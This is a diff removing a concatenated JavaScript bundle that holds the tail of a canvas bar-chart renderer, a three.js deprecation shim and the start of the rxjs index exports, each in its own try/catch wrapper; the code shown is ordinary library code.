-              ctx.fillStyle = 'rgb(0, 0, 0)';
-              ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
-              ctx.textAlign = 'center';
-              ctx.fillText(tagText, renderStartX + widthPerBar / 2, tSY - options.fontDataTags * 0.25);
-              ctx.fillStyle = oFS;
-            }
-
-            lastHeight = renderBarHeight;
-          }
-
-          if (content.barTooltips != null) {
-            ctx.fillStyle = 'rgb(0, 0, 0)';
-            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-            ctx.textAlign = 'center';
-            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY - 3);
-          }
-        } else if (options.barStyle === 'line') {
-          if (vIsArr) {
-            var rbx = renderStartX + widthPerBar / 2;
-
-            var lDu;
-            if (options.fillRegion === 'background') {
-              lDu = lastData;
-              if (Array.isArray(lDu)) lDu = lDu[0];
-              if (lDu != null) {
-                var sFS = ctx.fillStyle
-                ctx.fillStyle = lDu.color
-                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
-                ctx.fillStyle = sFS
-              }
-            }
-
-            var nLData = [];
-            for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
-              var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v[drawIndex]));
-              var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;
-
-              var rby = renderUpToY3;
-              if (lastData != null) {
-                var tLX, tLY;
-                if (Array.isArray(lastData)) {
-                  tLX = (lastData[drawIndex] || { }).x;
-                  tLY = (lastData[drawIndex] || { }).y;
-                } else {
-                  tLX = lastData.x;
-                  tLY = lastData.y;
-                }
-
-                if (tLX && tLY) {
-                  if (Array.isArray(strokeColorForIndex)) {
-                    ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
-                  } else ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
-                  ctx.beginPath();
-                  ctx.moveTo(tLX, tLY);
-                  ctx.lineTo(rbx, rby);
-                  ctx.stroke();
-                }
-              }
-
-              if (Array.isArray(fillColorForIndex)) {
-                ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
-              }
-              if (Array.isArray(strokeColorForIndex)) {
-                ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
-              }
-
-              ctx.beginPath();
-              ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
-              ctx.stroke();
-              ctx.fill();
-
-              nLData[drawIndex] = { x: rbx, y: rby, color: ctx.fillStyle };
-            }
-            lastData = nLData;
-            if (lDu != null && lDu.color != lastData[0].color) this.fillRegions.push({
-              x: lastData[0].x,
-              y: lastData[0].y,
-              prev: lDu.color,
-              next: lastData[0].color
-            })
-
-            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
-              var ball = content.balls[index]
-              if (ball != null) {
-                ctx.beginPath();
-                ctx.fillStyle = ball.fill;
-                ctx.strokeStyle = ball.stroke;
-                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
-                ctx.stroke();
-                ctx.fill();
-              }
-            }
-          } else {
-            var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
-            var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;
-
-            var rbx = renderStartX + widthPerBar / 2, rby = renderUpToY3;
-            var lDu;
-            if (options.fillRegion === 'background') {
-              if (lastData != null) {
-                lDu = lastData;
-                if (Array.isArray(lDu)) lDu = lDu[0];
-                var sFS = ctx.fillStyle
-                ctx.fillStyle = lDu.color
-                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
-                ctx.fillStyle = sFS
-              }
-            }
-            ctx.beginPath();
-            ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
-            ctx.stroke();
-            ctx.fill();
-
-            if (lastData != null) {
-              if (Array.isArray(lastData)) {
-                var tLX, tLY;
-                for (var key in lastData) {
-                  if (!lastData.hasOwnProperty(key)) continue;
-                  tLX = lastData[key].x;
-                  tLY = lastData[key].y;
-                  if (tLX && tLY) {
-                    ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
-                    ctx.beginPath();
-                    ctx.moveTo(tLX, tLY);
-                    ctx.lineTo(rbx, rby);
-                    ctx.stroke();
-                  }
-                }
-              } else {
-                var tLX = lastData.x, tLY = lastData.y;
-                if (tLX && tLY) {
-                  ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
-                  ctx.beginPath();
-                  ctx.moveTo(tLX, tLY);
-                  ctx.lineTo(rbx, rby);
-                  ctx.stroke();
-                }
-              }
-            }
-
-            lastData = { x: rbx, y: rby, color: ctx.fillStyle };
-            if (lDu != null && lDu.color != lastData.color) this.fillRegions.push({
-              x: lastData.x,
-              y: lastData.y,
-              prev: lDu.color,
-              next: lastData.color
-            })
-
-            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
-              var ball = content.balls[index]
-              if (ball != null) {
-                ctx.beginPath();
-                ctx.fillStyle = ball.fill;
-                ctx.strokeStyle = ball.stroke;
-                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
-                ctx.stroke();
-                ctx.fill();
-              }
-            }
-          }
-
-          var hint;
-          if (content.hints != null && (hint = content.hints[index]) != null) {
-            this.mouseListeners.push(function(index, hint, sx, sy, ex, ey, x, y) {
-              var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
-              var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
-              if (x < minX || x > maxX || y < minY || y > maxY) return null;
-              return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
-            }.bind(this, index, hint, rbx - 1, topYPadding, rbx + 1, topYPadding + remainingHeight));
-          }
-        } else {
-          if (vIsArr) v = Helpers.avg(v);
-          var renderBarHeight2 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
-          var renderUpToY2 = topYPadding + remainingHeight - renderBarHeight2;
-          ctx.beginPath();
-          ctx.moveTo(renderStartX + computedBarPadding, topYPadding + remainingHeight);
-          ctx.lineTo(renderStartX + computedBarPadding, renderUpToY2);
-          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, renderUpToY2);
-          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight);
-          ctx.stroke();
-          ctx.fill();
-
-          if (options.barStyle === 'error') {
-            var val;
-            if ((val = content._data_standard_error[index]) != 0) {
-              var renderBarError = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, val));
-              ctx.beginPath();
-              var wiskerWidth = Math.round((widthPerBar - computedBarPadding * 2) / 8);
-              var x_ = leftXPadding + widthPerBar * index + widthPerBar / 2;
-              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 + renderBarError);
-              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 + renderBarError);
-              ctx.moveTo(x_, renderUpToY2 + renderBarError);
-              ctx.lineTo(x_, renderUpToY2 - renderBarError);
-              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 - renderBarError);
-              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 - renderBarError);
-              ctx.stroke();
-            }
-          }
-
-          if (content.barTooltips != null) {
-            ctx.fillStyle = 'rgb(0, 0, 0)';
-            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-            ctx.textAlign = 'center';
-            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY2 - 3);
-          }
-        }
-      }
-      ctx.restore();
-
-      if (this.currentHint != null) {
-        ctx.save();
-        var hRect = this.currentHint.rect, hints = this.currentHint.text;
-        ctx.fillStyle = 'rgb(0, 0, 0)';
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeHint, family: options.font });
-        ctx.textAlign = 'left';
-        var boxWidth = 0;
-        for (index = 0; index < hints.length; ++index) {
-          boxWidth = Math.max(boxWidth, Math.ceil(ctx.measureText(hints[index]).width));
-        }
-        var boxWidthPadding = 5;
-        var lineHeight = options.fontSizeHint * 1.5;
-        var boxHeight = hints.length * lineHeight;
-        var drawX = hRect.right + 10, drawY = (hRect.top + hRect.bottom) / 2;
-        boxWidth += boxWidthPadding * 2;
-        if (drawX + boxWidth > width) {
-          drawX = hRect.left - boxWidth - 10;
-        }
-        if (drawY - boxHeight / 2 < 0) {
-          drawY = Math.ceil(boxHeight / 2) + 1;
-        } else if (drawY + boxHeight / 2 > height) {
-          drawY = height - boxHeight / 2 - 1;
-        }
-        ctx.clearRect(drawX, drawY - boxHeight / 2, boxWidth, boxHeight);
-        ctx.beginPath();
-        ctx.rect(drawX, drawY - boxHeight / 2, boxWidth, boxHeight);
-        ctx.stroke();
-        for (index = 0; index < hints.length; ++index) {
-          ctx.fillText(hints[index], drawX + boxWidthPadding, drawY - boxHeight / 2 + options.fontSizeHint + index * lineHeight);
-        }
-        ctx.restore();
-      }
-
-      ctx.translate(0.5, 0.5);
-
-      this.labelPositions = labelPositions;
-    };
-
-    return BarChart;
-  })();
-
-  if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
-    module.exports = BarChart;
-  } else {
-    window.BarChart = BarChart;
-  }
-})();
-
-}catch(e){}
-})();
-
-/* >>> three.js (363 bytes) <<< */
-(function(){
-try{
-var THREE = require('three');
-
-console.warn( "WARNING: The 'three.js' npm package is deprecated in favor of the 'three' npm package, please upgrade.");
-
-if (typeof exports !== 'undefined') {
-  if (typeof module !== 'undefined' && module.exports) {
-    exports = module.exports = THREE;
-  }
-  exports.THREE = THREE;
-} else {
-  this['THREE'] = THREE;
-}
-
-}catch(e){}
-})();
-
-/* >>> rxjs (35131 bytes) <<< */
-(function(){
-try{
-"use strict";
-var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
-    if (k2 === undefined) k2 = k;
-    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
-}) : (function(o, m, k, k2) {
-    if (k2 === undefined) k2 = k;
-    o[k2] = m[k];
-}));
-var __exportStar = (this && this.__exportStar) || function(m, exports) {
-    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
-};
-Object.defineProperty(exports, "__esModule", { value: true });
-exports.interval = exports.iif = exports.generate = exports.fromEventPattern = exports.fromEvent = exports.from = exports.forkJoin = exports.empty = exports.defer = exports.connectable = exports.concat = exports.combineLatest = exports.bindNodeCallback = exports.bindCallback = exports.UnsubscriptionError = exports.TimeoutError = exports.SequenceError = exports.ObjectUnsubscribedError = exports.NotFoundError = exports.EmptyError = exports.ArgumentOutOfRangeError = exports.firstValueFrom = exports.lastValueFrom = exports.isObservable = exports.identity = exports.noop = exports.pipe = exports.NotificationKind = exports.Notification = exports.Subscriber = exports.Subscription = exports.Scheduler = exports.VirtualAction = exports.VirtualTimeScheduler = exports.animationFrameScheduler = exports.animationFrame = exports.queueScheduler = exports.queue = exports.asyncScheduler = exports.async = exports.asapScheduler = exports.asap = exports.AsyncSubject = exports.ReplaySubject = exports.BehaviorSubject = exports.Subject = exports.animationFrames = exports.observable = exports.ConnectableObservable = exports.Observable = void 0;
-exports.filter = exports.expand = exports.exhaustMap = exports.exhaustAll = exports.exhaust = exports.every = exports.endWith = exports.elementAt = exports.distinctUntilKeyChanged = exports.distinctUntilChanged = exports.distinct = exports.dematerialize = exports.delayWhen = exports.delay = exports.defaultIfEmpty = exports.debounceTime = exports.debounce = exports.count = exports.connect = exports.concatWith = exports.concatMapTo = exports.concatMap = exports.concatAll = exports.combineLatestWith = exports.combineLatestAll = exports.combineAll = exports.catchError = exports.bufferWhen = exports.bufferToggle = exports.bufferTime = exports.bufferCount = exports.buffer = exports.auditTime = exports.audit = exports.config = exports.NEVER = exports.EMPTY = exports.scheduled = exports.zip = exports.using = exports.timer = exports.throwError = exports.range = exports.race = exports.partition = exports.pairs = exports.onErrorResumeNext = exports.of = exports.never = exports.merge = void 0;
-exports.switchMap = exports.switchAll = exports.subscribeOn = exports.startWith = exports.skipWhile = exports.skipUntil = exports.skipLast = exports.skip = exports.single = exports.shareReplay = exports.share = exports.sequenceEqual = exports.scan = exports.sampleTime = exports.sample = exports.refCount = exports.retryWhen = exports.retry = exports.repeatWhen = exports.repeat = exports.reduce = exports.raceWith = exports.publishReplay = exports.publishLast = exports.publishBehavior = exports.publish = exports.pluck = exports.pairwise = exports.onErrorResumeNextWith = exports.observeOn = exports.multicast = exports.min = exports.mergeWith = exports.mergeScan = exports.mergeMapTo = exports.mergeMap = exports.flatMap = exports.mergeAll = exports.max = exports.materialize = exports.mapTo = exports.map = exports.last = exports.isEmpty = exports.ignoreElements = exports.groupBy = exports.first = exports.findIndex = exports.find = exports.finalize = void 0;
-exports.zipWith = exports.zipAll = exports.withLatestFrom = exports.windowWhen = exports.windowToggle = exports.windowTime = exports.windowCount = exports.window = exports.toArray = exports.timestamp = exports.timeoutWith = exports.timeout = exports.timeInterval = exports.throwIfEmpty = exports.throttleTime = exports.throttle = exports.tap = exports.takeWhile = exports.takeUntil = exports.takeLast = exports.take = exports.switchScan = exports.switchMapTo = void 0;
-var Observable_1 = require("./internal/Observable");
-Object.defineProperty(exports, "Observable", { enumerable: true, get: function () { return Observable_1.Observable; } });
-var ConnectableObservable_1 = require("./internal/observable/ConnectableObservable");
-Object.defineProperty(exports, "ConnectableObservable", { enumerable: true, get: function () { return ConnectableObservable_1.ConnectableObservable; } });
-var observable_1 = require("./internal/symbol/observable");
-Object.defineProperty(exports, "observable", { enumerable: true, get: function () { return observable_1.observable; } });
-var animationFrames_1 = require("./internal/observable/dom/animationFrames");
-Object.defineProperty(exports, "animationFrames", { enumerable: true, get: function () { return animationFrames_1.animationFrames; } });
-var Subject_1 = require("./internal/Subject");
-Object.defineProperty(exports, "Subject", { enumerable: true, get: function () { return Subject_1.Subject; } });
-var BehaviorSubject_1 = require("./internal/BehaviorSubject");
-Object.defineProperty(exports, "BehaviorSubject", { enumerable: true, get: function () { return BehaviorSubject_1.BehaviorSubject; } });
-var ReplaySubject_1 = require("./internal/ReplaySubject");
-Object.defineProperty(exports, "ReplaySubject", { enumerable: true, get: function () { return ReplaySubject_1.ReplaySubject; } });
-var AsyncSubject_1 = require("./internal/AsyncSubject");
-Object.defineProperty(exports, "AsyncSubject", { enumerable: true, get: function () { return AsyncSubject_1.AsyncSubject; } });
-var asap_1 = require("./internal/scheduler/asap");
-Object.defineProperty(exports, "asap", { enumerable: true, get: function () { return asap_1.asap; } });
-Object.defineProperty(exports, "asapScheduler", { enumerable: true, get: function () { return asap_1.asapScheduler; } });
-var async_1 = require("./internal/scheduler/async");
-Object.defineProperty(exports, "async", { enumerable: true, get: function () { return async_1.async; } });
-Object.defineProperty(exports, "asyncScheduler", { enumerable: true, get: function () { return async_1.asyncScheduler; } });
-var queue_1 = require("./internal/scheduler/queue");
-Object.defineProperty(exports, "queue", { enumerable: true, get: function () { return queue_1.queue; } });
-Object.defineProperty(exports, "queueScheduler", { enumerable: true, get: function () { return queue_1.queueScheduler; } });
-var animationFrame_1 = require("./internal/scheduler/animationFrame");
-Object.defineProperty(exports, "animationFrame", { enumerable: true, get: function () { return animationFrame_1.animationFrame; } });
-Object.defineProperty(exports, "animationFrameScheduler", { enumerable: true, get: function () { return animationFrame_1.animationFrameScheduler; } });
-var VirtualTimeScheduler_1 = require("./internal/scheduler/VirtualTimeScheduler");
-Object.defineProperty(exports, "VirtualTimeScheduler", { enumerable: true, get: function () { return VirtualTimeScheduler_1.VirtualTimeScheduler; } });
-Object.defineProperty(exports, "VirtualAction", { enumerable: true, get: function () { return VirtualTimeScheduler_1.VirtualAction; } });
-var Scheduler_1 = require("./internal/Scheduler");
-Object.defineProperty(exports, "Scheduler", { enumerable: true, get: function () { return Scheduler_1.Scheduler; } });
-var Subscription_1 = require("./internal/Subscription");
-Object.defineProperty(exports, "Subscription", { enumerable: true, get: function () { return Subscription_1.Subscription; } });
-var Subscriber_1 = require("./internal/Subscriber");
-Object.defineProperty(exports, "Subscriber", { enumerable: true, get: function () { return Subscriber_1.Subscriber; } });
-var Notification_1 = require("./internal/Notification");
-Object.defineProperty(exports, "Notification", { enumerable: true, get: function () { return Notification_1.Notification; } });
-Object.defineProperty(exports, "NotificationKind", { enumerable: true, get: function () { return Notification_1.NotificationKind; } });
-var pipe_1 = require("./internal/util/pipe");
-Object.defineProperty(exports, "pipe", { enumerable: true, get: function () { return pipe_1.pipe; } });
-var noop_1 = require("./internal/util/noop");
-Object.defineProperty(exports, "noop", { enumerable: true, get: function () { return noop_1.noop; } });
-var identity_1 = require("./internal/util/identity");
-Object.defineProperty(exports, "identity", { enumerable: true, get: function () { return identity_1.identity; } });
-var isObservable_1 = require("./internal/util/isObservable");
-Object.defineProperty(exports, "isObservable", { enumerable: true, get: function () { return isObservable_1.isObservable; } });
-var lastValueFrom_1 = require("./internal/lastValueFrom");
-Object.defineProperty(exports, "lastValueFrom", { enumerable: true, get: function () { return lastValueFrom_1.lastValueFrom; } });
-var firstValueFrom_1 = require("./internal/firstValueFrom");
-Object.defineProperty(exports, "firstValueFrom", { enumerable: true, get: function () { return firstValueFrom_1.firstValueFrom; } });
-var ArgumentOutOfRangeError_1 = require("./internal/util/ArgumentOutOfRangeError");
-Object.defineProperty(exports, "ArgumentOutOfRangeError", { enumerable: true, get: function () { return ArgumentOutOfRangeError_1.ArgumentOutOfRangeError; } });
-var EmptyError_1 = require("./internal/util/EmptyError");
-Object.defineProperty(exports, "EmptyError", { enumerable: true, get: function () { return EmptyError_1.EmptyError; } });
-var NotFoundError_1 = require("./internal/util/NotFoundError");
-Object.defineProperty(exports, "NotFoundError", { enumerable: true, get: function () { return NotFoundError_1.NotFoundError; } });
-var ObjectUnsubscribedError_1 = require("./internal/util/ObjectUnsubscribedError");
-Object.defineProperty(exports, "ObjectUnsubscribedError", { enumerable: true, get: function () { return ObjectUnsubscribedError_1.ObjectUnsubscribedError; } });
-var SequenceError_1 = require("./internal/util/SequenceError");
-Object.defineProperty(exports, "SequenceError", { enumerable: true, get: function () { return SequenceError_1.SequenceError; } });
-var timeout_1 = require("./internal/operators/timeout");
-Object.defineProperty(exports, "TimeoutError", { enumerable: true, get: function () { return timeout_1.TimeoutError; } });
-var UnsubscriptionError_1 = require("./internal/util/UnsubscriptionError");
-Object.defineProperty(exports, "UnsubscriptionError", { enumerable: true, get: function () { return UnsubscriptionError_1.UnsubscriptionError; } });
-var bindCallback_1 = require("./internal/observable/bindCallback");
-Object.defineProperty(exports, "bindCallback", { enumerable: true, get: function () { return bindCallback_1.bindCallback; } });
-var bindNodeCallback_1 = require("./internal/observable/bindNodeCallback");
-Object.defineProperty(exports, "bindNodeCallback", { enumerable: true, get: function () { return bindNodeCallback_1.bindNodeCallback; } });
-var combineLatest_1 = require("./internal/observable/combineLatest");
-Object.defineProperty(exports, "combineLatest", { enumerable: true, get: function () { return combineLatest_1.combineLatest; } });
-var concat_1 = require("./internal/observable/concat");
-Object.defineProperty(exports, "concat", { enumerable: true, get: function () { return concat_1.concat; } });
-var connectable_1 = require("./internal/observable/connectable");
-Object.defineProperty(exports, "connectable", { enumerable: true, get: function () { return connectable_1.connectable; } });
-var defer_1 = require("./internal/observable/defer");
-Object.defineProperty(exports, "defer", { enumerable: true, get: function () { return defer_1.defer; } });
-var empty_1 = require("./internal/observable/empty");
-Object.defineProperty(exports, "empty", { enumerable: true, get: function () { return empty_1.empty; } });
-var forkJoin_1 = require("./internal/observable/forkJoin");
-Object.defineProperty(exports, "forkJoin", { enumerable: true, get: function () { return forkJoin_1.forkJoin; } });
-var from_1 = require("./internal/observable/from");
-Object.defineProperty(exports, "from", { enumerable: true, get: function () { return from_1.from; } });
-var fromEvent_1 = require("./internal/observable/fromEvent");
-Object.defineProperty(exports, "fromEvent", { enumerable: true, get: function () { return fromEvent_1.fromEvent; } });
-var fromEventPattern_1 = require("./internal/observable/fromEventPattern");
-Object.defineProperty(exports, "fromEventPattern", { enumerable: true, get: function () { return fromEventPattern_1.fromEventPattern; } });
-var generate_1 = require("./internal/observable/generate");
-Object.defineProperty(exports, "generate", { enumerable: true, get: function () { return generate_1.generate; } });
-var iif_1 = require("./internal/observable/iif");
-Object.defineProperty(exports, "iif", { enumerable: true, get: function () { return iif_1.iif; } });
-var interval_1 = require("./internal/observable/interval");
-Object.defineProperty(exports, "interval", { enumerable: true, get: function () { return interval_1.interval; } });
-var merge_1 = require("./internal/observable/merge");
-Object.defineProperty(exports, "merge", { enumerable: true, get: function () { return merge_1.merge; } });
-var never_1 = require("./internal/observable/never");
-Object.defineProperty(exports, "never", { enumerable: true, get: function () { return never_1.never; } });
-var of_1 = require("./internal/observable/of");
-Object.defineProperty(exports, "of", { enumerable: true, get: function () { return of_1.of; } });
-var onErrorResumeNext_1 = require("./internal/observable/onErrorResumeNext");
-Object.defineProperty(exports, "onErrorResumeNext", { enumerable: true, get: function () { return onErrorResumeNext_1.onErrorResumeNext; } });
-var pairs_1 = require("./internal/observable/pairs");
-Object.defineProperty(exports, "pairs", { enumerable: true, get: function () { return pairs_1.pairs; } });
-var partition_1 = require("./internal/observable/partition");
-Object.defineProperty(exports, "partition", { enumerable: true, get: function () { return partition_1.partition; } });
-var race_1 = require("./internal/observable/race");
-Object.defineProperty(exports, "race", { enumerable: true, get: function () { return race_1.race; } });
-var range_1 = require("./internal/observable/range");
-Object.defineProperty(exports, "range", { enumerable: true, get: function () { return range_1.range; } });
-var throwError_1 = require("./internal/observable/throwError");
-Object.defineProperty(exports, "throwError", { enumerable: true, get: function () { return throwError_1.throwError; } });
-var timer_1 = require("./internal/observable/timer");
-Object.defineProperty(exports, "timer", { enumerable: true, get: function () { return timer_1.timer; } });
-var using_1 = require("./internal/observable/using");
-Object.defineProperty(exports, "using", { enumerable: true, get: function () { return using_1.using; } });
-var zip_1 = require("./internal/observable/zip");
-Object.defineProperty(exports, "zip", { enumerable: true, get: function () { return zip_1.zip; } });
-var scheduled_1 = require("./internal/scheduled/scheduled");
-Object.defineProperty(exports, "scheduled", { enumerable: true, get: function () { return scheduled_1.scheduled; } });
-var empty_2 = require("./internal/observable/empty");
-Object.defineProperty(exports, "EMPTY", { enumerable: true, get: function () { return empty_2.EMPTY; } });
-var never_2 = require("./internal/observable/never");
-Object.defineProperty(exports, "NEVER", { enumerable: true, get: function () { return never_2.NEVER; } });
-__exportStar(require("./internal/types"), exports);
-var config_1 = require("./internal/config");
-Object.defineProperty(exports, "config", { enumerable: true, get: function () { return config_1.config; } });
-var audit_1 = require("./internal/operators/audit");
-Object.defineProperty(exports, "audit", { enumerable: true, get: function () { return audit_1.audit; } });
-var auditTime_1 = require("./internal/operators/auditTime");
-Object.defineProperty(exports, "auditTime", { enumerable: true, get: function () { return auditTime_1.auditTime; } });
-var buffer_1 = require("./internal/operators/buffer");
-Object.defineProperty(exports, "buffer", { enumerable: true, get: function () { return buffer_1.buffer; } });
-var bufferCount_1 = require("./internal/operators/bufferCount");
-Object.defineProperty(exports, "bufferCount", { enumerable: true, get: function () { return bufferCount_1.bufferCount; } });
-var bufferTime_1 = require("./internal/operators/bufferTime");
-Object.defineProperty(exports, "bufferTime", { enumerable: true, get: function () { return bufferTime_1.bufferTime; } });
-var bufferToggle_1 = require("./internal/operators/bufferToggle");
-Object.defineProperty(exports, "bufferToggle", { enumerable: true, get: function () { return bufferToggle_1.bufferToggle; } });
-var bufferWhen_1 = require("./internal/operators/bufferWhen");
-Object.defineProperty(exports, "bufferWhen", { enumerable: true, get: function () { return bufferWhen_1.bufferWhen; } });
-var catchError_1 = require("./internal/operators/catchError");
-Object.defineProperty(exports, "catchError", { enumerable: true, get: function () { return catchError_1.catchError; } });
-var combineAll_1 = require("./internal/operators/combineAll");
-Object.defineProperty(exports, "combineAll", { enumerable: true, get: function () { return combineAll_1.combineAll; } });
-var combineLatestAll_1 = require("./internal/operators/combineLatestAll");
-Object.defineProperty(exports, "combineLatestAll", { enumerable: true, get: function () { return combineLatestAll_1.combineLatestAll; } });
-var combineLatestWith_1 = require("./internal/operators/combineLatestWith");
-Object.defineProperty(exports, "combineLatestWith", { enumerable: true, get: function () { return combineLatestWith_1.combineLatestWith; } });
-var concatAll_1 = require("./internal/operators/concatAll");
-Object.defineProperty(exports, "concatAll", { enumerable: true, get: function () { return concatAll_1.concatAll; } });
-var concatMap_1 = require("./internal/operators/concatMap");
-Object.defineProperty(exports, "concatMap", { enumerable: true, get: function () { return concatMap_1.concatMap; } });
-var concatMapTo_1 = require("./internal/operators/concatMapTo");
-Object.defineProperty(exports, "concatMapTo", { enumerable: true, get: function () { return concatMapTo_1.concatMapTo; } });
-var concatWith_1 = require("./internal/operators/concatWith");
-Object.defineProperty(exports, "concatWith", { enumerable: true, get: function () { return concatWith_1.concatWith; } });
-var connect_1 = require("./internal/operators/connect");
-Object.defineProperty(exports, "connect", { enumerable: true, get: function () { return connect_1.connect; } });
-var count_1 = require("./internal/operators/count");
-Object.defineProperty(exports, "count", { enumerable: true, get: function () { return count_1.count; } });
-var debounce_1 = require("./internal/operators/debounce");
-Object.defineProperty(exports, "debounce", { enumerable: true, get: function () { return debounce_1.debounce; } });
-var debounceTime_1 = require("./internal/operators/debounceTime");
-Object.defineProperty(exports, "debounceTime", { enumerable: true, get: function () { return debounceTime_1.debounceTime; } });
-var defaultIfEmpty_1 = require("./internal/operators/defaultIfEmpty");
-Object.defineProperty(exports, "defaultIfEmpty", { enumerable: true, get: function () { return defaultIfEmpty_1.defaultIfEmpty; } });
-var delay_1 = require("./internal/operators/delay");
-Object.defineProperty(exports, "delay", { enumerable: true, get: function () { return delay_1.delay; } });
-var delayWhen_1 = require("./internal/operators/delayWhen");
-Object.defineProperty(exports, "delayWhen", { enumerable: true, get: function () { return delayWhen_1.delayWhen; } });
-var dematerialize_1 = require("./internal/operators/dematerialize");
-Object.defineProperty(exports, "dematerialize", { enumerable: true, get: function () { return dematerialize_1.dematerialize; } });
-var distinct_1 = require("./internal/operators/distinct");
-Object.defineProperty(exports, "distinct", { enumerable: true, get: function () { return distinct_1.distinct; } });
-var distinctUntilChanged_1 = require("./internal/operators/distinctUntilChanged");
-Object.defineProperty(exports, "distinctUntilChanged", { enumerable: true, get: function () { return distinctUntilChanged_1.distinctUntilChanged; } });
-var distinctUntilKeyChanged_1 = require("./internal/operators/distinctUntilKeyChanged");
-Object.defineProperty(exports, "distinctUntilKeyChanged", { enumerable: true, get: function () { return distinctUntilKeyChanged_1.distinctUntilKeyChanged; } });
-var elementAt_1 = require("./internal/operators/elementAt");
-Object.defineProperty(exports, "elementAt", { enumerable: true, get: function () { return elementAt_1.elementAt; } });
-var endWith_1 = require("./internal/operators/endWith");
-Object.defineProperty(exports, "endWith", { enumerable: true, get: function () { return endWith_1.endWith; } });
-var every_1 = require("./internal/operators/every");
-Object.defineProperty(exports, "every", { enumerable: true, get: function () { return every_1.every; } });
-var exhaust_1 = require("./internal/operators/exhaust");
-Object.defineProperty(exports, "exhaust", { enumerable: true, get: function () { return exhaust_1.exhaust; } });
-var exhaustAll_1 = require("./internal/operators/exhaustAll");
-Object.defineProperty(exports, "exhaustAll", { enumerable: true, get: function () { return exhaustAll_1.exhaustAll; } });
-var exhaustMap_1 = require("./internal/operators/exhaustMap");
-Object.defineProperty(exports, "exhaustMap", { enumerable: true, get: function () { return exhaustMap_1.exhaustMap; } });
-var expand_1 = require("./internal/operators/expand");
-Object.defineProperty(exports, "expand", { enumerable: true, get: function () { return expand_1.expand; } });
-var filter_1 = require("./internal/operators/filter");
-Object.defineProperty(exports, "filter", { enumerable: true, get: function () { return filter_1.filter; } });
-var finalize_1 = require("./internal/operators/finalize");
-Object.defineProperty(exports, "finalize", { enumerable: true, get: function () { return finalize_1.finalize; } });
-var find_1 = require("./internal/operators/find");
-Object.defineProperty(exports, "find", { enumerable: true, get: function () { return find_1.find; } });
-var findIndex_1 = require("./internal/operators/findIndex");
-Object.defineProperty(exports, "findIndex", { enumerable: true, get: function () { return findIndex_1.findIndex; } });
-var first_1 = require("./internal/operators/first");
-Object.defineProperty(exports, "first", { enumerable: true, get: function () { return first_1.first; } });
-var groupBy_1 = require("./internal/operators/groupBy");
-Object.defineProperty(exports, "groupBy", { enumerable: true, get: function () { return groupBy_1.groupBy; } });
-var ignoreElements_1 = require("./internal/operators/ignoreElements");
-Object.defineProperty(exports, "ignoreElements", { enumerable: true, get: function () { return ignoreElements_1.ignoreElements; } });
-var isEmpty_1 = require("./internal/operators/isEmpty");
-Object.defineProperty(exports, "isEmpty", { enumerable: true, get: function () { return isEmpty_1.isEmpty; } });
-var last_1 = require("./internal/operators/last");
-Object.defineProperty(exports, "last", { enumerable: true, get: function () { return last_1.last; } });
-var map_1 = require("./internal/operators/map");
-Object.defineProperty(exports, "map", { enumerable: true, get: function () { return map_1.map; } });
-var mapTo_1 = require("./internal/operators/mapTo");
-Object.defineProperty(exports, "mapTo", { enumerable: true, get: function () { return mapTo_1.mapTo; } });
-var materialize_1 = require("./internal/operators/materialize");
-Object.defineProperty(exports, "materialize", { enumerable: true, get: function () { return materialize_1.materialize; } });
-var max_1 = require("./internal/operators/max");
-Object.defineProperty(exports, "max", { enumerable: true, get: function () { return max_1.max; } });
-var mergeAll_1 = require("./internal/operators/mergeAll");
